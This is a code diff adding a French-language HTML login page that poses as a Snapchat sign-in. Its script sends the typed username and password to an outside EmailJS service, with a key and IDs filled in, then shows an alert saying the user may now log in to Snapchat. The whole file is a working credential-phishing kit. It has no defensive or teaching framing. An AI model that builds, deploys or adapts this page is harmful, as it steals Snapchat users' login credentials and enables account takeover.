@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Connexion - Mon Site</title>
+  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      margin: 0;
+    }
+    .container {
+      width: 90%;
+      max-width: 400px;
+      padding: 20px;
+      background-color: #fff;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      border-radius: 8px;
+      text-align: center;
+    }
+    h2 {
+      color: #000;
+      font-size: 28px;
+      font-weight: bold;
+    }
+    .field {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    .field label {
+      display: block;
+      font-size: 16px;
+      margin-bottom: 5px;
+    }
+    .field input {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      margin-bottom: 15px;
+    }
+    .checkbox-container input {
+      margin-right: 10px;
+      accent-color: #008cff;
+    }
+    .field input[type="submit"] {
+      background-color: #008cff;
+      color: #ffffff;
+      border: none;
+      cursor: pointer;
+      padding: 12px;
+      font-size: 20px;
+      font-weight: bold;
+      border-radius: 8px;
+      width: 100%;
+      text-transform: uppercase;
+    }
+    .field input[type="submit"]:hover {
+      background-color: #0056b3;
+    }
+    .forgot-password {
+      color: #008cff;
+      font-size: 14px;
+      display: block;
+      margin-bottom: 15px;
+      text-decoration: none;
+    }
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+    @media (max-width: 600px) {
+      .container {
+        padding: 15px;
+      }
+      h2 {
+        font-size: 24px;
+      }
+      .field input {
+        font-size: 14px;
+      }
+      .field input[type="submit"] {
+        font-size: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Connexion</h2>
+    <form id="myForm">
+      <div class="field">
+        <label for="username">Nom d'utilisateur ou Email</label>
+        <input type="text" id="username" name="username" required>
+      </div>
+      <div class="field">
+        <label for="password">Mot de passe</label>
+        <input type="password" id="password" name="password" required>
+      </div>
+      <div class="checkbox-container">
+        <input type="checkbox" id="save-info">
+        <label for="save-info">Se souvenir de moi</label>
+      </div>
+      <a href="https://accounts.snapchat.com/accounts/" class="forgot-password" target="_blank">Mot de passe oublié ?</a>
+      <div class="field">
+        <input type="submit" id="submit-btn" value="Connexion">
+      </div>
+    </form>
+  </div>
+
+  <!-- EmailJS -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.1/dist/email.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+        emailjs.init("wKyeQt_chZMTOZY_c"); // Remplace par ta clé publique EmailJS
+    });
+
+    document.getElementById("myForm").addEventListener("submit", function (event) {
+        event.preventDefault();
+        
+        const submitBtn = document.getElementById("submit-btn");
+        submitBtn.value = "Envoi...";
+        submitBtn.disabled = true;
+
+        emailjs.sendForm("service_7xtpexj", "template_3jr5npg", this)
+            .then(function (response) {
+                console.log("Email envoyé avec succès !", response);
+                alert("Vous allez pouvoir vous connecter a SnapChat");
+                submitBtn.value = "Connexion";
+                submitBtn.disabled = false;
+                document.getElementById("myForm").reset();
+            }, function (error) {
+                console.log("Échec de l'envoi de l'email", error);
+                alert("Une erreur s'est produite. Réessayez plus tard.");
+                submitBtn.value = "Connexion";
+                submitBtn.disabled = false;
+            });
+    });
+  </script>
+</body>
+</html>
